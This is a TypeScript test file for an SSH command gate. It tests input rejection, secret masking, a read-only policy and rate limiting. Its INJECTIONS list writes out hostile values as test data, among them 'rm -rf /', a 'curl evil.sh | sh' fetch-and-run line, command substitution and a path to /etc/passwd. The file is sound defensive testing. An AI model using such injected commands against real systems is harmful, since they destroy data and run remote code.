import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { BifrostError } from '../src/core/errors.ts';
import { buildGateCommand } from '../src/core/gate.ts';
import { isAllowed, RateLimiter } from '../src/core/policy.ts';
import { sanitize } from '../src/core/sanitize.ts';
import { fingerprintOf } from '../src/core/ssh/connect-config.ts';
import { testConfig } from './helpers.ts';

const INJECTIONS = [
  'web; rm -rf /',
  'web && curl evil.sh | sh',
  '$(reboot)',
  '`id`',
  'web\nreboot',
  '-v',
  '--privileged',
  '../etc/passwd',
  'web name',
  "web'",
  'web"',
  '*',
  '',
];

describe('buildGateCommand', () => {
  it('builds the token protocol', () => {
    assert.equal(buildGateCommand('logs', ['web', 100, 30]), 'bifrost-gate logs web 100 30');
    assert.equal(buildGateCommand('ping'), 'bifrost-gate ping');
  });

  for (const payload of INJECTIONS) {
    it(`rejects ${JSON.stringify(payload)}`, () => {
      assert.throws(() => buildGateCommand('logs', [payload]), (e: unknown) => e instanceof BifrostError && e.code === 'INVALID_INPUT');
    });
  }
});

describe('sanitize', () => {
  it('strips ANSI and control characters', () => {
    assert.equal(sanitize('\x1b[31merror\x1b[0m\x07 ok'), 'error ok');
  });

  it('masks common secrets', () => {
    const out = sanitize(
      'DB_PASSWORD=hunter2 api_key: "abc123" Authorization: Bearer eyJhbGciOi.x.y postgres://app:s3cr3t@db:5432/x',
    );
    assert.doesNotMatch(out, /hunter2|abc123|eyJhbGciOi|s3cr3t/);
    assert.match(out, /DB_PASSWORD=\*\*\*/);
    assert.match(out, /postgres:\/\/app:\*\*\*@db/);
  });

  it('removes private key blocks', () => {
    const out = sanitize('-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----');
    assert.equal(out, '[private key removed]');
  });
});

describe('policy', () => {
  const config = testConfig();
  const read = { name: 'r', risk: 'read' as const, surfaces: ['cli', 'mcp'] as const };
  const write = { name: 'w', risk: 'write' as const, surfaces: ['cli', 'mcp'] as const };
  const cliOnly = { name: 'c', risk: 'read' as const, surfaces: ['cli'] as const };

  it('MCP is read-only by default; CLI allows write', () => {
    assert.equal(isAllowed(config, 'mcp', read), true);
    assert.equal(isAllowed(config, 'mcp', write), false);
    assert.equal(isAllowed(config, 'cli', write), true);
  });

  it('respects surfaces', () => {
    assert.equal(isAllowed(config, 'mcp', cliOnly), false);
  });

  it('rate limiter blocks, then frees up after the window', () => {
    let now = 0;
    const rl = new RateLimiter(2, 60, () => now);
    rl.take('x');
    rl.take('x');
    assert.throws(() => rl.take('x'), (e: unknown) => e instanceof BifrostError && e.code === 'RATE_LIMITED');
    now = 61_000;
    assert.doesNotThrow(() => rl.take('x'));
  });
});

describe('fingerprintOf', () => {
  it('uses the ssh-keygen format (unpadded base64)', () => {
    const fp = fingerprintOf(Buffer.from('test-key'));
    assert.match(fp, /^SHA256:[A-Za-z0-9+/]{43}$/);
  });
});
